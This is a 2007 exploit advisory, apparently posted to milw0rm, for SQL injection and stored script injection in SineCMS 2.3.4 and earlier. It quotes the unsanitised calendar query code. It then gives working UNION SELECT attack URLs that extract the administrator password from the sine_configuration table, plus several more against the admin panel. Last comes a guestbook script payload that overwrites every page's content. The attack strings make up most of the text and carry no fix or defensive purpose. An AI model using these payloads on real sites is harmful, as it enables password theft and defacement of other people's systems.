<html><head><title>SineCMS <= 2.3.4 Calendar Remote SQL Injection Vulnerability</title></head><pre>---------------------------------------------------------------
 ____            __________         __             ____  __   
/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
 |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\
 |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
 |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|  
          \/\______|      \/     \/                         
---------------------------------------------------------------

Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 

---------------------------------------------------------------

SineCMS &lt;= 2.3.4 Calendar SQL Injection 'n something else..

---------------------------------------------------------------

#By KiNgOfThEwOrLd				

---------------------------------------------------------------
Notes:

Only with magic_quotes_gpc -&gt; Off
---------------------------------------------------------------
Corrupted file: 

mods/Calendar/index.php
---------------------------------------------------------------
Corrupted code:

[...]
function Evento ($sine){
	if (!isset($_GET[id]) OR $_GET[id]==&quot;&quot;) {
	header(&quot;Location: index.php&quot;);
	}
	$query = &quot;SELECT * FROM &quot;.$sine[db][prefisso_tab].&quot;calendario WHERE id='$_GET
[id]'&quot;;
	if ($_GET[id]){
		$result = mysql_query($query, $sine[db][db]);
		$row = mysql_fetch_array($result);
[...]
---------------------------------------------------------------
Exploit:

http://[target]/[sinecms_path]/mods.php?
mods=Calendar&amp;action=info&amp;id='+union+select+1,password,3,4,5,6,7,8,9
+from+sine_configuration/*
---------------------------------------------------------------
Something else..

There are a lots of useless sql injection in the admin panel, like...

http://[target]/[sinecms_path]/admin/mods_adm.php?
mods=Guestbook&amp;action=modifica&amp;id='+union+select+1,2,3,4,password,
6+from+sine_configuration/*

http://[target]/[sinecms_path]/admin/mods_adm.php?
mods=Calendar&amp;mese=11'+union+select+1,password,3,4,5,6,7,8,9
+from+sine_configuration/*

http://[target]/[sinecms_path]/admin/mods_adm.php?
mods=Calendar&amp;action=modify&amp;id='+union+select+1,2,3,4,password,6,7,8,9
+from+sine_configuration/*

http://[target]/[sinecms_path]/admin/mods_adm.php?
mods=Calendar&amp;anno='+union+select+1,password,3,4,5,6,7,8,9
+from+sine_configuration/*

and much more..
---------------------------------------------------------------
There is also a permanent html injection in the guestbook, and i belive it can 
be considered so dangerous, coz the &quot;last comments&quot; module it's included in all 
the pages...then, an attacker can rewrite alle the pages posting a comment like

&lt;script&gt;document.body.innerHTML=&quot;[Arbitrary_Code]&quot;;&lt;/script&gt;

in the &quot;username&quot; or &quot;comment&quot; field.
---------------------------------------------------------------

# milw0rm.com [2007-12-05]</pre></html>